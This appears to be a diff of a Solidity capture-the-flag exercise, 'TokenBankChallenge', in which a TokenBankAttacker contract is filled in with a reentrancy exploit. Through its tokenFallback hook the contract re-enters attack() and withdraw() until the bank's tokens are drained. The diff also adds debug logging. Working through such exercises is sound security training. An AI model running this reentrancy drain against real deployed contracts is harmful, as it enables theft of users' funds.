@@ -1,6 +1,8 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
+import {console} from "forge-std/console.sol";
+
 interface ITokenReceiver {
     function tokenFallback(
         address from,
@@ -29,7 +31,7 @@ contract SimpleERC223Token {
     function isContract(address _addr) private view returns (bool is_contract) {
         uint256 length;
         assembly {
-            //retrieve the size of the code on target address, this needs assembly
+        //retrieve the size of the code on target address, this needs assembly
             length := extcodesize(_addr)
         }
         return length > 0;
@@ -115,7 +117,6 @@ contract TokenBankChallenge {
     ) public {
         require(msg.sender == address(token));
         require(balanceOf[from] + value >= balanceOf[from]);
-
         balanceOf[from] += value;
     }
 
@@ -131,10 +132,35 @@ contract TokenBankChallenge {
 
 // Write your exploit contract below
 contract TokenBankAttacker {
-    TokenBankChallenge public challenge;
+    TokenBankChallenge public bank;
+    SimpleERC223Token public token;
 
     constructor(address challengeAddress) {
-        challenge = TokenBankChallenge(challengeAddress);
+        bank = TokenBankChallenge(challengeAddress);
+        token = bank.token();
+        console.log("CONSTRUCTOR");
+        console.log("Attacker bank balance: %d", bank.balanceOf(address(this)));
+        console.log("Attacker token balance: %d", token.balanceOf(address(this)));
     }
-    // Write your exploit functions here
+
+    function attack() public {
+        console.log("ATTACK");
+        console.log("Attacker bank balance: %d", bank.balanceOf(address(this)));
+        console.log("Attacker token balance: %d", token.balanceOf(address(this)));
+        token.transfer(address(bank), token.balanceOf(address(this)));
+        bank.withdraw(bank.balanceOf(address(this)));
+    }
+
+    function tokenFallback(address from, uint256 value, bytes memory data) public {
+        console.log("Attacker fallback called from:", from, "with value:", value);
+        if (from == address(bank)) {
+            console.log("TOKEN FALLBACK");
+            console.log("Attacker bank balance: %d", bank.balanceOf(address(this)));
+            console.log("Attacker token balance: %d", token.balanceOf(address(this)));
+            console.log("Bank token balance: %d", token.balanceOf(address(bank)));
+            if(token.balanceOf(address(bank)) > 0) {
+                attack();
+            }
+        }
+    }
 }
